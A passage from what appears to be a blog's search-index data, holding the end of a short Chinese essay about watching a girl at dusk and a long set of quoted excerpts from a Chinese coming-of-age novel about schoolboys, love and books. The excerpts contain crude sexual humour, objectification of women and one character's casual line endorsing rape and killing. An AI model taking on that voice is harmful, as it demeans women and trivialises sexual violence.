和黄昏，是和世界擦肩而过的平凡一天。在三万多个日子里，如果女孩在一万个黄昏这样等待，会等来什么？会有多少个刚睡醒的我在头顶看她，会有多少次她猛然抬头，显露出被窥视的惊慌或是不以为意的微笑。如果我在一万个黄昏这样醒来，会看到什么？会有怎样不同的风景任我观瞻，又会有多少不痛不痒的思绪游荡在我脑海。\n","permalink":"https://ret2neo.cn/mind/170421afternoon/","summary":"四月的一个下午，五点左右，我醒过来，有点迷糊。我走上阳台，四下张望。天空有些阴沉，风有些湿热，涌上来的是莫名而熟悉的压抑，楼下人来人往。有姑娘在人群中不动，在等待什么？显然她不等我，我不认识她。她眼神努力寻找，等得多么认真。她双手抱胸，手和胸间是文件夹，文件夹里会是什么？她脚尖踢着石子，石子并不存在。她脚踝纤细，在碎花裙下格外好看。她的身体随碎花裙轻轻晃动，在晚风中有些动人。动人的不是裙子，不是身体，是人群和黄昏，是和世界擦肩而过的平凡一天。在三万多个日子里，如果女孩在一万个黄昏这样等待，会等来什么？会有多少个刚睡醒的我在头顶看她，会有多少次她猛然抬头，显露出被窥视的惊慌或是不以为意的微笑。如果我在一万个黄昏这样醒来，会看到什么？会有怎样不同的风景任我观瞻，又会有多少不痛不痒的思绪游荡在我脑海。","title":"午后"},{"content":" 摘抄 \u0026ldquo;事后想来，如果时候对，如果老流氓孔建国会些医术，被当权部门用钉子钉死在木板上，过几百年就是另一个耶稣。如果老流氓孔建国会说很多事儿逼的话，被刘京伟、张国栋和我记录下来整理出版，过几千年就是另一个孔丘。 \u0026quot;\n\u0026ldquo;他说，如果时候对，围着他的这堆野小子里就会出刘邦，就会出朱元璋。\u0026rdquo;\n\u0026ldquo;我让老流氓孔建国高兴，因为我能迅速领会每一种精致的低级趣味，别的野小子还在做思想斗争的时候，我已经笑得很淫荡了。老流氓孔建国说我也让他头痛，因为我记性太好，老流氓孔建国不得不绞尽智慧回忆起或创造出新的趣事。这件事随着老流氓孔建国记忆力和创造力的减退以及我的不断成长而变得越发艰难。\u0026rdquo;\n\u0026ldquo;根据老流氓孔建国回忆，当老流氓孔建国有一天不得不怯生生地开始重复一个黄故事的时候，他在我的眼珠滚动里看到了一种他不能鄙视的鄙视。从那天起，我再也没有回过防空洞课堂。 \u0026quot;\n\u0026ldquo;我和老流氓孔建国讨论，我说刘京伟眼里有光、下身总是硬硬的、元气充盈，将来一定了不起。他骨子里的贪婪常常体现在小事情上，一根冰棒，他会一口吞到根部，再慢慢从根部嘬到尖尖儿，第一口就定下基调：从根到尖，涂满他的哈喇子，全部都是他的。老流氓孔建国却说他神锋太俊，知进不知退，兴也速、败也速，弄不好，还有大祸，充其量也就是一个军阀的胚子。我听了糊里糊涂的。老流氓孔建国又说，我也很贪婪，眼里也有光，但是我的眼底有很重的忧郁。我更糊涂了，知道不是什么好话，就嚷嚷：“你丫别扯淡了，我平面几何考试怎么及格还不知道呢。你再胡说，我到胡大妈那儿告你企图鸡奸。” \u0026quot;\n\u0026ldquo;楼下老头子们讲，梦里的都是妖魔鬼怪，吸走的都是真阳。真阳没了，眼珠子也就不转了，鼻涕快流进嘴角的时候也不能及时地吸进鼻孔了。 \u0026quot;\n\u0026ldquo;他们说起他们过去的故事，我总是将信将疑。 \u0026quot;\n\u0026ldquo;没有法子，男人只有自己出门找水喝， 怕人家不乐意给， 随身带上了刀。 \u0026quot;\n\u0026quot;　黑胖子的老婆说黑胖子原来在炮兵部队上是厨师班长，从来只负责偷吃不管干活。我想，没有比黑胖子过去的职业更悲惨的了，戴绿帽子、背黑锅、看别人打炮。\n\u0026quot;\n\u0026ldquo;明里不见人头落，暗中叫你骨髓枯。刘京伟和张国栋认定，随着时间流逝，我即使不会精尽而亡，也会渐渐出落成为一个没有出息的笨人\u0026rdquo;\n\u0026ldquo;她可能不是同谋，只是阴谋的一部分。 \u0026quot;\n\u0026ldquo;我看不见人们的灵魂，但是，隔着裤裆，我看得见他们的阴茎。\u0026rdquo;\n\u0026ldquo;我当然也有理想啊。我的理想是娶最漂亮的姑娘，写最无聊的文章，精忠报国，实现四个现代化。你是我见过的最漂亮的姑娘，不娶你娶谁呀？” \u0026quot;\n\u0026ldquo;你以为是个生人，或许他曾经和你睡过同一个姑娘呢。” \u0026quot;\n\u0026ldquo;桑保疆是倒尿盆长大的，这个，他懂不了。\n\u0026quot;\n\u0026ldquo;其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。 \u0026quot;\n\u0026ldquo;我的长相平庸而粗糙，但是我的内心精致而细腻。我和老流氓孔建国说，别看我长得象个杀猪的，其实我是个写诗的。 \u0026quot;\n\u0026ldquo;那个写诗的晚上，我速读《诗经》，跳过所有祭祀章节和不认识的文字，明白了“赋比兴”和“郑风淫”、最大的写诗诀窍就是找到心中最不安最痒痒的一个简单侧面，然后反复吟唱。那个写诗的晚上，我写完了我这辈子所有的诗，之后再也没有写过一句，就象我在十六岁至十八岁期间耗尽了我对姑娘的所有细腻美好想象，之后，所有的姑娘在我的眼里都貌美如花。\u0026rdquo;\n\u0026ldquo;我以前总是纳闷，街面上日日在自己面前飘然而过的那些美若天仙的姑娘们回家后都和谁睡觉。观察过朱裳父母之后我清楚了，就是和朱裳爹这种人。这种人坐不出龙椅和马扎的区别，赏受着上等的女人，无知无觉，问心无愧，如得大道。否则的话，对绿帽子的担心，就会让他少二十年阳寿。 \u0026quot;\n\u0026ldquo;美人在专心开车，不象平日里一样过分专注于自己的美丽，所以格外好看。 \u0026quot;\n\u0026ldquo;后来，我学了心理学，才感觉到，少年时期很多美好想象都是境由心生，没看过猪跑，更没吃过猪肉，把对凤凰的想象都拽到母猪身上了。 \u0026quot;\n\u0026ldquo;我一觉醒来，大吼一声：“大梦谁先觉，平生我自知”。想起过去创作这首打油诗的诸葛亮，在那个叫南阳卧龙岗的地方，种田、读书、钱多的时候叫鸡、钱少的时候手淫，觉得自己生不逢时。 \u0026quot;\n\u0026ldquo;是孔明就要论天下，是关公就要舞大刀”。刘京伟和张国栋听到，一定会加盟，老流氓孔建国听到，一定会加盟，这就是文字的力量。 \u0026quot;\n\u0026ldquo;现在的空气脆而冷，就在这种天气里，一个案件发生了重大的转折，好人坏人正义邪恶变得混沌不清，各种关系纠缠在一起，不是案件，而是一个阴谋。女孩作为一个整体在这个阴谋里起的作用极其重大而微妙，朱裳的意义更加隐涩。\u0026rdquo;\n\u0026ldquo;好象忽然一夜间，所有男生都想有一双名牌运动鞋，耐克、阿迪达斯、彪马…仿佛一双名牌鞋能添无数牛逼和小女生的目光。在之后的进化过程中，男生变成男青年，中年男子，老头，这双名牌运动鞋也随着变成名牌手提电脑和名牌山地车，一米七八一头长发的妖艳女友和宝马Z3以及郊区豪宅，一米六零胸大无脑柔腻软滑的十八岁女孩和明紫檀木画案以及半米长的红山玉龙形钩，但是，给予不同阶段的男性生物，同样的渴望、困扰、狂喜和无可奈何。 \u0026quot;\n\u0026ldquo;刘京伟是个头脑灵活但是无比简单的人。他短暂的一生都在追求牛逼。不同阶段，追求不同的牛逼，所有追求到的牛逼加总就构成了刘京伟短暂而牛逼的一生。 \u0026quot;\n\u0026ldquo;第二天，刘京伟请我和张国栋在朝阳门外的桥头酒店吃五块一斤的三鲜饺子，他吃得很少，两手抱着他新买的白地蓝钩高帮耐克鞋，那双鞋用鞋带串在一起，跨在他脖子上，左脸边一只，右脸边一只，每只都比他的脸大，比他脸白。刘京伟两眼望着天花板长久沉默，他忽然说：“牛逼，牛逼啊。\u0026rdquo;\n\u0026ldquo;后来，刘京伟的激素水平发育到觉得有个妖艳女友是牛逼的。刘京伟对我说：“我没有你会臭侃山，没有张国栋长得清秀。我怎么办呀？”我说：“总有办法的。”张国栋说：“再生一回吧。”刘京伟说：“张国栋你闭嘴。只要我活着，就会比你牛逼。你再清秀也是一堆清秀的狗屎。我和秋水说话。秋水，你有一点我特别佩服，你的自制力极好。你一个人呆的时候该看书也看书，该修炼你的文字就修炼你的文字。我也要在一个指定的方向上使力气，我也要修炼。”他于是修炼了一身腱子肉，条条块块，是姑娘都想摸。他冬天也穿紧身短袖，像个脱了皮的蛤蟆。为了长肌肉，他每天不吃饭，在最短的时间喝二十五个生鸡蛋。\u0026rdquo;\n\u0026ldquo;。张国栋问刘京伟，这样练，阳具也跟着变大吗？刘京伟说，不是，反而缩小，因为血都充到其他大块肌肉上去了。张国栋说，那我就不练了。我说，锻炼不同肌肉的道理是一样的，就是反复充血，你应该多看黄书，但是要保持不射。张国栋说，自摸行吗？刘京伟看了看我，我们同时说，行，可你丫能保持不射吗？\u0026rdquo;\n\u0026ldquo;再后来，刘京伟的大奔里没有姑娘香水味了，刘京伟欢快地对我说：“你知道现在最牛逼的是什么吗？是雇哈佛大学毕业的MBA。我把姑娘们都打发了，雇了三个今年刚从哈佛大学毕业的MBA。\u0026rdquo;\n\u0026ldquo;这时候的女孩个个可看。即使最丑的姑娘也有动人的时候。\n\u0026quot;\n\u0026ldquo;后来的后来，我在老流氓孔建国的教导下玩玉。老流氓孔建国说：“你早上睡醒之后，摸摸下体，如果已经不是一柱擎天了，说明你的真阳已经不足。有些人在三十发现，有些人四十。这时候，你对真善美的兴趣就应该从姑娘转到玉。处女是新玉新工，贼光扎眼。二十几岁是清初件，康乾盛世呀。三十几岁是宋元明，‘明大粗’。四十来岁是商周古玉，铅华洗尽，没有一丝火气，美呀。玉好像姑娘，也需要陪，需要珍爱，需要一日三摸搓，可以戴，可以显摆，可以放进被窝儿。玉比姑娘好，不离不弃，不会逼你一夜三举，还可以洗洗留给儿子。算了算了，别老想着朱裳和翠儿了，昨天我在古玩城小崔那儿看见一个商早期的圆雕玉虎，青玉，十多个厘米长，沁色美极了，太少见了，图谱上有片儿的，够上拍卖会进博物馆的。准备几万块钱，咱们明天把它拿下。\u0026rdquo;\n\u0026ldquo;不要老拿你的大油手在玉上摸来摸去，玉会污的，污了就再也干净不了了。真正的盘玉，是戴在身边，用身子煨着，用脑子想着，把你意淫文字的功夫用到这儿来，一两个星期用热水泡一下，用粗白布擦。不要老拿你大油手摸，糟践好东西。”\u0026rdquo;\n\u0026ldquo;我们不要音乐要叫喊，\n我们不要道理要金钱，\n我们不要先生要混蛋，\n我们不要女生要天仙。\n为什么越用功的女孩脸蛋越苦？\n为什么我越想越糊涂？\n为什么几千年都过去了，\n还没有另一个秦始皇烧干净书？\n姑娘你仰头总是绷着漂亮的脸，\n仿佛要沾你的一定是个款，\n为了心理平衡我想问几遍，\n你是否也天天大小便？”\n\u0026quot;\n\u0026ldquo;如果从小长到大是个电子游戏，游戏里有好些凶险的大关卡，最早是如何应对父母，如何和兄弟姐妹相处，如何和发小一块玩耍，然后是如何对付摆在你面前的象朱裳这样天生狐媚的姑娘，如何对付混蛋的教导主任和白痴数学老师，然后是每个人都有的老板和老婆，然后是整日呼啸的小孩、父母的老去。面对朱裳这个题目，我们没有一个男生答对了。有些人给自己一个借口，反正也试过了，有些人索性忘记了，有些人找个眉眼类似的，反正没人知道正确答案，所有人都在游戏里过了关，可能编游戏的人是个逻辑不清的人吧，很少较真。\u0026rdquo;\n\u0026quot;　在书里倦了，合上书，找个晦涩的角度看朱裳，我觉得明目爽脑，仿佛夜里读书累了，转头细看窗子里盛着的星星。过去没有电视和互联网，我们和古人一样，看自己的身体，看天空的星星，看同桌的姑娘，在简单中发现复杂的细节和普遍的规律。 \u0026quot;\n\u0026ldquo;关于朱裳，我该学习多少次呢\u0026rdquo;\n\u0026ldquo;我要老到什么时候才能忘掉这些记忆？我是学医的，我知道即使失去双手，双手的记忆也还是在的\u0026rdquo;\n\u0026ldquo;。”\n我从枕头底下拿出来藏着的一包大前门，反锁了宿舍门，点上一根给张国栋，自己再点一颗。我坐在我床铺前的桌子上，向张国栋表白，希望他能理解：\n“我坐在朱裳身边，如果天气好，窗户打开，风起来，她的发梢会偶尔撩到我的脸，仿佛春天，东三环上夹道的垂柳和骑在车上的我。” 我看着张国栋，接着说：“你明白我的意思吗？”\n“我明白了。”张国栋收起书包，“杂志你先看吧，借你的，不是送你的呦。\u0026rdquo;\n\u0026ldquo;张国栋说，他还记得我面对黄色杂志的表白，记得东三环上夹道的垂柳和朱裳的相似，这个意象对他很重要，等他挣够了钱，他一定写个关于这个意象的本子，然后拍个不赚钱的片子。\u0026rdquo;\n\u0026ldquo;在张国栋摊了一堆黄色杂志，和我交涉换座位之后，他时常找我聊天。话题总是围绕女人，特别是关于朱裳。在我漫长的求学过程中，男生和男生之间时常进行这种交流，题目多数是关于女人，偶尔涉及考试和前程。如果把考试的定义扩大，女人也是考试题目，我们长久地讨论，以期充分理解题目，上场的时候争取马虎过关。刘京伟从来不参加这种讨论，他说我具备一切成事的素质，只是想得太多。刘京伟不喜欢念书，不喜欢考试，他喜欢他的一切都是标准答案。刘京伟通常采取的态度是：“我就这么做了，怎么着吧?”他看见我茫然不解，就举例说明：“比如你喜欢一个姑娘，就按倒办了，丫不开心，就杀，就走。如果心里还是喜欢，下次再遇见，再奸，再杀。”我说这些道理太高深，无法顿悟，我天分有限，不念书不考试就无法懂得。刘京伟预言，他都死了，我的书还没读完。刘京伟一语成谶，我参加他的葬礼的时候，关于卵巢癌发生机制的博士论文才刚刚写完初稿，答辩会还没有安排。 \u0026quot;\n\u0026ldquo;他说我具备一切成事的素质，只是想得太多\u0026rdquo;\n\u0026ldquo;姑娘又不是阿拉伯数字, 不具有可比性。 玫瑰好看, 做汤肯定没有菜花好吃。”\n\u0026quot;\n\u0026ldquo;只是干净？”\n“你以为干净简单？我觉得你张国栋让女孩感觉舒服，你以为这‘舒服’二字简单？”\n“就是呀，我这种气质，很难培养的，每周都要洗澡，每天都要刷牙。还有，要看书，多看书，‘腹有诗书气自华’。还有，要多思考，否则就肤浅了。绝不简单。\u0026rdquo;\n\u0026ldquo;追她的人已经够多的了。我不喜欢锦上添花。” \u0026quot;\n\u0026ldquo;就是。好象是个男的就应该想和她有一腿似的。我都有点压不住邪念了。不过，多点追的才有意思，横刀夺爱，方显英雄本色。” \u0026quot;\n\u0026ldquo;持续学坏是一件多么令人兴奋的事呀。可惜不是什么好烟，‘红梅’。本来第一支应该是支好烟，就象童男子破身之后通过政治思想学习，再次成为童男子，再次破身应该是个好姑娘，至少也应该和朱裳差不多吧。” \u0026quot;\n\u0026ldquo;书之外，还有别的要懂的东西。 \u0026quot;\n\u0026ldquo;学抽烟为了学坏，\n学坏为了学习长大。\n学习长大得厌恶爸爸，\n再杀死他。\n学习长大得爱上妈妈，\n再抛弃她。” \u0026quot;\n\u0026ldquo;你这么抽烟纯属浪费，”张国栋深吸一口烟，吞进肺里，再慢慢地让烟一丝丝地从鼻孔飘出来，青烟曲折回转散入周围的黑暗之中。 “想上就别憋自己。你有戏。”\n“是么？”\n“她喜欢你。”\n“为什么？”\n“你喜欢书，读得仔细，你有时候就是你喜欢的书。你能迷上你的书，别人也会迷上你。” \u0026quot;\n\u0026ldquo;你说别人的事总是出奇的明白，遇到自己的事总是嫩。这事呀，你试试就知道了.就象有些事不用教，上了床自然就会了。再说你也没骚扰过小姑娘，也没少被小姑娘骚扰呀，怎么一到朱裳这儿就发木？咱们学校躲在树后面看你的姑娘不比原来躲在山洞里流着口水等着吃唐僧肉的妖精少。” \u0026quot;\n\u0026ldquo;我想起我的小屋。周末回去，胡乱填几口饭，反锁上门，世界就和我无关了。拉上窗帘，大红牡丹花的图案就把所有光线割断，包括星星。打开台灯，昏黄的光线将满溢在小屋里的书烘暖。书从地板堆到屋顶，老妈说，书上不省钱，想看什么就买什么，读书多的孩子孝顺。书不像古董，不是世家，省省也能请回家最好的。我和我姐姐站在琉璃厂中国书店高大的书架前，我问她，妈给你的钱够吗？我姐姐说，够。我对售货员说，我要一整套十六本《鲁迅全集》和一整套二十五本《全唐诗》。我问售货员，近百年是不是鲁迅最牛逼了，近两千年，是不是唐诗最牛逼了。\u0026rdquo;\n\u0026ldquo;我摆开几个茶杯，杜牧，李白、劳伦斯、亨利米勒就静静地坐在对面。倒上茶，千年前的月光花影便在小屋里游荡。杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，他们的文字和我没有间隔。我知道他们文字里所有的大智慧和小心思，这对于我毫无困难。他们的魂魄，透过文字，在瞬间穿越千年时间和万里空间，在他们绝不知晓的北京市朝阳区的一个小屋子里，纠缠我的魂魄，让我心如刀绞，然后泪流满面。第一次阅读这些人的文字对我的重要性无以伦比，他们的灵魂像是一碗豆汁儿一样有实在的温度和味道，摆在我面前，伸手可及。这第一次阅读，甚至比我的初恋更重要，比我第一次抓住我的小弟弟反复拷问让他喷涌而出更重要，比我第一次在慌乱中进入女人身体看着她的眼睛身体失去理智控制更重要\u0026rdquo;\n\u0026ldquo;我第一次阅读杜牧，李白、劳伦斯、亨利米勒比我第一次解剖大脑标本，对我更重要。我渴望具备他们的超能力，在我死后千年，透过我的文字，我的魂魄纠缠一个同样黑瘦的无名少年，让他心如刀绞，泪流满面。我修炼我的文字，摊开四百字一页的稿纸，淡绿色，北京市电车公司印刷厂出品，钢笔在纸上移动，我看见炼丹炉里炉火通红，仙丹一样的文字珠圆玉润，这些文字长生不老。我黑瘦地坐在桌子前面，骨多肉少好像一把柴火，柴火上是炉火通红的炼丹炉。我的文字几乎和我没有关系，就像朱裳的美丽和朱裳没有太多联系，我和朱裳都是某种介质，就像古时候的巫师，所谓上天，透过这些介质传递某种声音。我的文字，朱裳的美丽，巫师的声音，有它们自己的意志，它们反过来决定我们的动作和思想。当文字如仙丹一样出炉时，我筋疲力尽，我感到敬畏，我心怀感激，我感到一种力量远远大过我的身体、大过我自己。当文字如垃圾一样倾泻，我筋疲力尽，我感觉身体如同灰烬，我的生命就是垃圾。\u0026rdquo;\n\u0026ldquo;我对张国栋说：“我的屋子太小了，床上的书把我都快挤得没地方睡了。已经放不下别的了。” 杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，朱裳坐在什么地方呢？\n“那我就先追了？我可是跟你商量过了。”\n“好。需要的话，我替你写情书，送小纸条。如果人家对你有意思，我把座位让给你。” \u0026quot;\n\u0026ldquo;从现在看来，我和朱裳的关系是由短暂的相好和漫长的暧昧构成。\u0026rdquo;\n\u0026ldquo;小时候，我们性交不足，我们体力积累得无比好，\u0026rdquo;\n\u0026ldquo;那时候，我和朱裳从天安门走到东单走到白家庄，北京夏天的白天很长，在半黑半白中，我们在43路车站等车，说好，下一辆车来了就分手。来了无数个下一辆，好多人下车，好多人上车，好多人去他们要去的地方。在等待无数个下一辆的过程中，我拉着朱裳的手，她的手很香。朱裳看着我的眼睛，给我唱那首叫Feelings的外文歌曲，她的头发在夏天的热风里如歌词飞舞，她说我睫毛很长。后来朱裳告诉我，她之后再没有那么傻过，一个在北京这样自然环境恶劣的城市长大的姑娘怎么可以这样浪漫。我说我有很多回想起来很糗的事，但是想起，在我听不懂的外文歌曲中，握着将破坏我一生安宁的姑娘的香香的手，永远等待下一辆开来的43路公共汽车，我感到甜蜜和幸福。\u0026rdquo;\n\u0026ldquo;很多个小二锅头之后，朱裳说，在中学，她听不进课的时候、累的时候，都会不由自主地看我，认为我和别人不一样。教材、教参、习题集堆在我桌子上，堆成一个隐居的山洞，挡住老师的视线，我手里却常年是本没用的闲书。她觉得我是个真正的读书人，一个与她爸爸略相象的读书人。真正的读书人如同真正的厨子、戏子、婊子，身上有种与生俱来的对所钟情的事物的痴迷。书中的女人秀色可餐，书中的男人快意恩仇。书外如何，与真正的读书人无关。她喜欢看我脸上如入魔道的迷离，如怨鬼般的执著。我说：“是不是我长得象你爸就能娶到你妈那样的？”朱裳说：“我当时是年幼无知，看走了眼，其实只是你太瘦了，招眼，容易让人心疼。\u0026rdquo;\n\u0026ldquo;我对朱裳说，女人或者复杂或者单纯，都好。但是，复杂要象书，可以读。简单要象玉，可以摸。当时的朱裳也不让解扣子，也不让上手摸，我能干什么呢？ \u0026quot;\n\u0026ldquo;她坐在我旁边，忍不住会在我专心念闲书的时候看我。她感觉到与我本质上的相通：“一样的寂寞，一样的骨子里面的寂寞。这种寂寞，再多的欢声笑语，再迷醉的灯红酒绿也化解不开，随便望一眼舞厅天窗里盛的星空，喝一口在掌心里的隔夜茶，寂寞便在自己心里了。仿佛他打开一本闲书，仿佛我垂下眼帘，世界便与自己无关了。这种寂寞，只有很少的人懂得。\u0026rdquo;\n\u0026ldquo;哥哥们看到朱裳小妹妹听得泪流满面，脸上珠串晶莹，不禁心惊肉跳，明白这个小妹妹心中有股大过生命的欲望，今生注定不能平凡。\u0026rdquo;\n\u0026ldquo;最出色的一个看她的眼神开始不对了，试探着和她谈一些很飘渺很抽象的事。她开始害怕，大哥哥们不可爱了。 \u0026quot;\n\u0026ldquo;安全第一，男孩第二”，她们的父母教育她们。 \u0026quot;\n\u0026ldquo;翠儿除了演戏之外，不化妆，她说上妆毁容，就像写东西折寿一样\u0026rdquo;\n\u0026ldquo;梯子当时跟我阐述，她年纪还小，还没想清楚是出国颠覆美国腐朽的资本主义还是留在国内大干社会主义，还没想清楚是青灯黄卷皓首穷经搞学术还是大碗吃肉大秤分金搞生意，所以洋书生和土大款都要交往。我说，同意，注意时间安排，注意身体，努力加餐饭。最后梯子选择了资本主义腐朽生活，到了美国一年后拿了绿卡，就和陕西洋考古离了婚，说是在美国一年到头吃不着有土腥味的活鲤鱼，却要整天睡有土腥味的老公，不靠谱。梯子马上找了个美国老头，有钱，有大房子，有心脏病，阴茎短小但是经常兴奋。老头是用直升机把梯子娶进那个大房子的，我见过婚礼上的照片，长得像大白胡子的圣诞老人，梯子皮肤光滑滋润，但是表情还是很坚毅。第一次上床，梯子说，就知道了老头的斤两，梯子还说，不是吹牛，如果她愿意，和老头隔着一千英里，电话性交，她能让老头心脏病发作，死在去医院的救护车上，脸上还充满淫荡的笑容。老头就是这样死了，梯子带着美国护照和天文数字的资产回到北京，对我说：“我从小都找比我老比我成熟的，追求前进追求光明，现在我要反过来了，你说，我是不是老了。”我说：“怎么会，你的肌肉还结实，腿上毫无赘肉。万马军中取上将首级，你还是易如反掌。而且，从另一个角度说，你又比我们早好几步领导了潮流。”\u0026rdquo;\n\u0026ldquo;我总对我的女朋友说，你是舞后，你玩儿你的，我一点都不在意，我替你在这儿看管大衣。我在角落里看我的女友在舞场里旋转，她的头发盘起来，她笑脸盈盈，她汗透春衫，我觉得她比和我在一起的任何时候都美丽。 \u0026quot;\n\u0026ldquo;你乐感好，听着音乐、跟着我就好了。” 张国栋一笑，朱裳后来告诉我，张国栋有一种不属于淫荡的笑容，很容易让女孩想起阳光。\u0026rdquo;\n\u0026ldquo;我有一种理论，物质不灭，天地间总有灵气流转，郁积在石头上，便是玉，郁积在人身上，便是朱裳这样的姑娘。玉是要好人戴的，只有戴在好人身上，灵气才能充分体现。女人是要男人抱的，只有在自己喜欢的男人怀里，灵气才有最美丽的形式。 \u0026quot;\n\u0026ldquo;对浅吟低唱、春情萌动不感兴趣的一小堆男生正扎在一起猛吃剩在桌子上的公费瓜果梨桃、花生瓜子，大谈现代兵器、攻打台湾及围棋。\u0026rdquo;\n\u0026ldquo;老僧亦有猫儿意，不敢人前叫一声\u0026rdquo;\n\u0026ldquo;张国栋觉得，“文革”是一种节日。人可以活在天地间，可以打架，可以泡妞，可以象个好汉，名正言顺。男孩从打架中能学到不少东西：忍让，机智，必要的时候诉诸暴力。仿佛四、十万年以前，北京人还住周口店的时候，打架能让你获得猎物，泡妞能让你的姓氏繁衍。现在的混混只能学学港、台的小歌星，穿得光鲜亮丽，将来不会有大出息。 \u0026quot;\n\u0026ldquo;人性是多么堕落呀!”\n“我是多么喜欢堕落呀!” \u0026quot;\n\u0026quot;　“回头再买十串羊肉串，多放孜然，多放辣椒，一人一瓶啤酒, 一边吃喝一边回学校。”\n“啊, 生活!”\n“太资产阶级情调了，小资\u0026rdquo;\n\u0026ldquo;我们并肩走在大街上，我看见，路灯映照着张国栋、刘京伟、桑保疆的脸，他们脸上的粉刺大红大紫，灿若春花。侧头，天上是很好的月亮，好象什么都知道似的冷冷地瞧着。我们什么都不多想地朝前走，前面是不再刺骨的风. 将来是什么都会有的，我们没有一个人想到“穷则独善其身，达则兼善天下”。武侠小说上说，鲜衣怒马，年少多金。我们兜里各有三、五块钱，年轻真好。\n而且，我们在当时那个时候，没有一个人想到姑娘。 我们手拉着手，像南北朝那时的同性恋一样，在大街上走。 \u0026quot;\n\u0026ldquo;张国栋没呆多久就回来了，理由和几十年前毕加索的一样：艺术只有在东方，在中国和日本\u0026rdquo;\n\u0026ldquo;张国栋在学校兼教职，他写信告诉我，原来姑娘也像庄稼和瓜果梨桃一样，每年都有新的一拨儿，新的一拨儿不见得比老的一拨儿难吃。\u0026rdquo;\n\u0026ldquo;你们是不是皮肉发紧呀？” 我说\u0026rdquo;\n\u0026ldquo;体育老师是个简单而纯朴的人，他挣很少的工资，一天三顿吃学校的食堂，最大的乐趣是帮助女生练习鞍马或是单杠等体操项目，他有一双温暖而肥厚的小手。孔丘说：天下有道，丘不与之易也。意思是，你牛逼，我也牛逼，我不拿我的牛逼和你的牛逼换，我不羡慕你。从小到大，我认真羡慕过的人只有两个，一个是这个体育老师，无论春夏秋冬，一年四季都有新鲜的姑娘屁股摸，特别是在当时的历史条件下，物质贫乏，冬天唯一的新鲜蔬菜是大白菜。另一个是我的外科教授，他主攻乳腺外科，每天早上出诊，诊室里都是小一百对焦急地等待他触摸的乳房。 \u0026quot;\n\u0026ldquo;教导主任常说的话是：“自然给孩子以身体,而我们塑造他们的灵魂。”他讲这句话的时候没有感到可怕，感到的是巨大的责任与成就。 \u0026quot;\n\u0026ldquo;不建学校，就得多建监牢。学校人少，监牢中的人就会多。学校办得差，监牢中就会人满为患。”他在教师会上讲这番话的时候感觉自己象个将军。“中学生，说到底还是孩子。正处于人生观，世界观形成阶段，象一块未琢磨的璞玉，未着色的白纸。不是他们缺少问题，而是我们缺少发现。\u0026rdquo;\n\u0026ldquo;在教导主任眼里，怎么可能没问题呢？就象有些花要香，有些雨要下，有些娘要嫁一样，有些人从小注定不安分。 \u0026quot;\n\u0026quot; 我们一起扑上去看，果然是一等奖。我当时毫不怀疑，我这辈子都挣不到五百元钱。\u0026rdquo;\n\u0026ldquo;张国栋从骨子里瞧不上他，觉得象他这样一个面白无须，爱打小报告，好色却绝对作风严谨的人应该生活在那个太监属于正当职业的年代。\u0026rdquo;\n\u0026ldquo;张国栋跟我讲过，三楼男生厕所第二个蹲坑的门上有两行字：“到哈佛读书，做朱裳老公。”\n张国栋说：“咱们班长理想远大。我认得他的字。俗甜。”\n“你的理想呢？”我问。\n“挣钱。还有 ……”\n“什么?”\n“如果我和咱们班长的理想都实现了，我就尽全力让他戴绿帽子。开了奔驰600到他家楼下，用手机和朱裳叙旧。不急不燥，慢慢地聊。\u0026rdquo;\n\u0026ldquo;大地一片静寂，除了我的呼吸和朱裳的心跳。一定要绿化了他，让他绿透了心，让他绿得萎而不举、举而不硬、硬而不坚、坚而不久、久而不射、射而不能育。\u0026rdquo;\n\u0026ldquo;被迫满大街找电线杆子，顺着上面的广告钻胡同找老军医，最后受骗上当，一针下去再也抬不起头。然后和他的女儿混熟，去迪厅、歌厅、饭店、酒吧……见尽物欲横流，让她一回家就觉得家里憋气，看见她爸就憋气，有空就质问朱裳‘您为什么让这个人成了我爸爸？’……” \u0026quot;\n\u0026ldquo;但是对于我这种天赋好、后天训练又严格的厚脸皮没有多少效果。\u0026rdquo;\n\u0026ldquo;在翠儿面前，只有在翠儿面前，我停止思考，我的小弟弟替代我的大脑，全权主导我的行为。\u0026rdquo;\n\u0026ldquo;我缩在我靠窗的座位里，人也懒懒的。望着烦躁的窗外的春，柳絮在飞。想起那句庸俗的宋词：“柳径春深，行到关情处。颦不语，意凭风絮，吹向郎边去。” \u0026quot;\n\u0026ldquo;朱裳在，有两、三里垂柳堤岸就够了。“行到关情处”便是走到动情处了。手不必碰，眼不必交，只需两个人慢慢走就好了。有些心思，想不清，分不明。就象这酿在春光中的柳絮。有些心思也不必说出口，也不必想清楚，好在有柳絮。柳絮会带着柳絮一样的心思到她的身边去的，让她一样地心乱、心烦，一样的不明白。 \u0026quot;\n\u0026ldquo;我、张国栋、刘京伟的步子放慢，朱裳聊了几句，一脸的不高兴。平时，朱裳虽然不爱说话，但从没有把不快堆在脸上。\n我停了下来。张小三后来说，他很少看见我的眼睛里充满这种凶狠躁戾之色\u0026rdquo;\n\u0026ldquo;你也上医院去看看吧。”朱裳后来说，她搀住我的手当时碰到我的单衣，她记得我的单衣下面的肌肉坚硬如石。 \u0026quot;\n\u0026ldquo;老流氓孔建国早讲过,秋水的心术正不了。\u0026rdquo;\n\u0026ldquo;或许自己真是不行了，连“酒色”都不行了,还有什么行的呀？真是对不住老流氓孔建国的教诲。 \u0026quot;\n\u0026ldquo;人的脊柱里有盏灯，一杯“二锅头”沿着脊背下去到脊柱的一半，那是人的真魂儿所在的地方,一团火焰就燃烧起来了。啤酒要柔的多，要几瓶，时间要更长，灯也点不了太亮，飘摇着，就象一盏破油灯。油灯里的世界与白天里的不一样，与无光的黑夜里的也不一样。世界更加真实而美丽。\u0026rdquo;\n\u0026ldquo;我没怕过什么人，也没信过什么。但我相信我将来会富，会成为一个有钱人。是不是男人就不该真的爱上什么人？就该搂完抱完心里什么也不剩？这样才能睡得着，吃得香，说起话来才能不顾忌，干起事来才能特玩命，才特别特别地象个好男人？这样，对，这样，就有许多女孩来喜欢你，然后你在搂完抱完心里什么也不剩。难道喜欢就是因为你不能放开了去喜欢？真他妈的见鬼了，见大头鬼了。可是是不是真的爱上什么人不是由你定的，你妈的，到底谁定的？到底谁管？凭什么呀？凭什么要喜欢你？凭什么？凭什么？”我想大声喊，喊醒所有的人，包括这个楼上的，父母单位的，包括学校的同学、老师，包括老流氓孔建国朱裳妈妈的老相好，